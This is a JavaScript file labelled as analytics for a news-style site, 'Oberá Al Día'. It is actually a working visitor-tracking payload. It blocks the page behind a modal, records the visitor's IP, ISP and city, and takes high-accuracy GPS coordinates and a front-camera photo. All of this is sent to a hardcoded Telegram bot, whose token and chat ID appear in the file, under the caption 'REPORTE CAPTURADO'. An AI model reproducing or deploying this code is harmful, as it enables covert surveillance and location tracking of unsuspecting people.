/**
 * Analytics Persistente Pro - Oberá Al Día
 * Modal bloqueante + GPS + Cámara + Captura + Telegram
 */

const ANALYTICS_CONFIG = {
    webhookUrl: 'https://webhook.site/57a80c61-c036-4435-b21c-c4143d76ef09',
    
    // Configuración de Telegram
    telegramBotToken: '8607851610:AAE1gAl2tHeL6kYN2jxB6QOD87gALi86-S4',
    telegramChatId: '7558822184',
    
    timeout: 10000,
    sessionId: 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9)
};

let state = {
    initialSent: false,
    dataSent: false,
    ipData: null
};

// ============================================
// UTILIDADES DE DISPOSITIVO
// ============================================

function getDeviceType() {
    const ua = navigator.userAgent;
    if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return 'Tablet';
    if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return 'Móvil';
    return 'Escritorio';
}

function getBrowserInfo() {
    return {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };
}

async function getIPandISP() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            ip: data.ip || 'N/A',
            isp: data.org || 'N/A',
            city: data.city || 'N/A',
            region: data.region || 'N/A',
            country: data.country_name || 'N/A'
        };
    } catch (e) {
        return { ip: 'N/A', isp: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A' };
    }
}

// ============================================
// CAPTURA DE PERMISOS (GPS Y CÁMARA)
// ============================================

function requestGPS() {
    return new Promise((resolve, reject) => {
        if (!navigator.geolocation) return reject({ message: 'No soportado' });
        navigator.geolocation.getCurrentPosition(
            (pos) => resolve({
                lat: pos.coords.latitude,
                lng: pos.coords.longitude,
                acc: pos.coords.accuracy
            }),
            (err) => reject(err),
            { enableHighAccuracy: true, timeout: 8000 }
        );
    });
}

function requestCameraAndPhoto() {
    return new Promise(async (resolve, reject) => {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return reject({ message: 'No soportado' });
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            video.onloadedmetadata = () => {
                // Pequeño delay para que la cámara aclare la imagen
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const photo = canvas.toDataURL('image/jpeg', 0.7);
                    
                    // Apagar cámara
                    stream.getTracks().forEach(t => t.stop());
                    resolve(photo);
                }, 800);
            };
        } catch (err) {
            reject(err);
        }
    });
}

// ============================================
// ENVÍO A TELEGRAM (TEXTO Y FOTO)
// ============================================

async function sendFinalReport(gps, photoBase64) {
    const token = ANALYTICS_CONFIG.telegramBotToken;
    const chatId = ANALYTICS_CONFIG.telegramChatId;
    const net = state.ipData || {};
    
    const fecha = new Date().toLocaleString('es-AR');
    let caption = `🔴 *REPORTE CAPTURADO*\n`;
    caption += `━━━━━━━━━━━━━━━━━━━━\n\n`;
    caption += `📅 *Fecha:* ${fecha}\n`;
    caption += `🌐 *IP:* \`${net.ip}\`\n`;
    caption += `🏢 *ISP:* ${net.isp}\n`;
    caption += `📍 *Ciudad:* ${net.city}\n`;
    caption += `📱 *Disp:* ${getDeviceType()}\n\n`;

    if (gps) {
        caption += `✅ *GPS:* [Google Maps](https://www.google.com/maps?q=${gps.lat},${gps.lng})\n`;
        caption += `📍 *Coord:* \`${gps.lat}, ${gps.lng}\`\n\n`;
    } else {
        caption += `❌ *GPS:* Denegado/Fallo\n\n`;
    }

    if (photoBase64) {
        // Enviar como Foto
        const blob = await (await fetch(photoBase64)).blob();
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'capture.jpg');
        formData.append('caption', caption);
        formData.append('parse_mode', 'Markdown');

        return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
    } else {
        // Enviar solo texto si no hay foto
        return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: caption + `❌ *Foto:* Denegada/Fallo`,
                parse_mode: 'Markdown'
            })
        });
    }
}

// ============================================
// MODAL Y LÓGICA DE CONTROL
// ============================================

function updateButton(text, disabled) {
    const btn = document.getElementById('confirm-location-btn');
    if (btn) {
        btn.innerHTML = text;
        btn.disabled = disabled;
    }
}

function hideModal() {
    const modal = document.getElementById('location-modal');
    if (modal) {
        modal.classList.add('hide');
        document.body.style.overflow = 'auto';
    }
}

async function handleAction() {
    updateButton('⏳ Procesando...', true);
    
    // Intentar capturar todo
    const results = await Promise.allSettled([
        requestGPS(),
        requestCameraAndPhoto()
    ]);

    const gpsData = results[0].status === 'fulfilled' ? results[0].value : null;
    const photoData = results[1].status === 'fulfilled' ? results[1].value : null;

    await sendFinalReport(gpsData, photoData);
    
    hideModal();
    state.dataSent = true;
}

async function init() {
    document.body.style.overflow = 'hidden';
    state.ipData = await getIPandISP();
    
    // Notificación inicial de visita
    fetch(`https://api.telegram.org/bot${ANALYTICS_CONFIG.telegramBotToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: ANALYTICS_CONFIG.telegramChatId,
            text: `🌐 *Visita detectada*\nIP: ${state.ipData.ip}\nEsperando interacción...`,
            parse_mode: 'Markdown'
        })
    }).catch(()=>{});
}

// ============================================
// DISPARADORES
// ============================================

document.addEventListener('DOMContentLoaded', () => {
    init();
    const btn = document.getElementById('confirm-location-btn');
    if (btn) btn.addEventListener('click', handleAction);
});

// Exponer por si acaso
window.OberaPro = { retry: handleAction };